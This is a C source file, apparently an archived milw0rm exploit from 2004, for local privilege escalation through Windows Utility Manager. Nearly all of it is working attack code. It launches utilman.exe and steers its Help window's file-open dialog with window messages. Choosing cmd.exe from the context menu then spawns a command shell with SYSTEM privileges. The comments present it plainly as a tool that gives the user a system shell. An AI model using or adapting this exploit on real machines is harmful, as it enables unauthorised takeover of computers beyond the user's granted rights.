// By Cesar Cerrudo cesar appsecinc com
// Local elevation of priviliges exploit for Windows Utility Manager
// Gives you a shell with system privileges
// If you have problems try changing Sleep() values.

#include <stdio.h> 
#include <windows.h> 
#include <commctrl.h>
#include <Winuser.h>

int main(int argc, char *argv[]) 
{ 
  HWND lHandle, lHandle2;
  POINT point;

  char sText[]="%windir%\\system32\\cmd.ex?";

  // run utility manager
  system("utilman.exe /start");
  Sleep(500);

  // execute contextual help
  SendMessage(FindWindow(NULL, "Utility manager"), 0x4D, 0, 0);
  Sleep(500);

  // open file open dialog windown in Windows Help
  PostMessage(FindWindow(NULL, "Windows Help"), WM_COMMAND, 0x44D, 0);
  Sleep(500);

  // find open file dialog window
  lHandle = FindWindow("#32770","Open");

  // get input box handle
  lHandle2 = GetDlgItem(lHandle, 0x47C);
  Sleep(500);

  // set text to filter listview to display only cmd.exe
  SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)sText);
  Sleep(800);

  // send return
  SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);

  //get navigation bar handle
  lHandle2 = GetDlgItem(lHandle, 0x4A0);
  //send tab
  SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
  Sleep(500);
  lHandle2 = FindWindowEx(lHandle,NULL,"SHELLDLL_DefView", NULL);
  //get list view handle
  lHandle2 = GetDlgItem(lHandle2, 0x1);

  SendMessage (lHandle2, WM_IME_KEYDOWN, 0x43, 0); // send "c" char
  SendMessage (lHandle2, WM_IME_KEYDOWN, 0x4D, 0); // send "m" char
  SendMessage (lHandle2, WM_IME_KEYDOWN, 0x44, 0); // send "d" char
  Sleep(500);
  
  // popup context menu
  PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
  Sleep(1000);

  // get context menu handle
  point.x =10; point.y =30;
  lHandle2=WindowFromPoint(point);

  SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);   // move down in menu
  SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);   // move down in menu
  SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0); // send return

  SendMessage (lHandle, WM_CLOSE,0,0); // close open file dialog window

  return(0);
}




// milw0rm.com [2004-04-15]
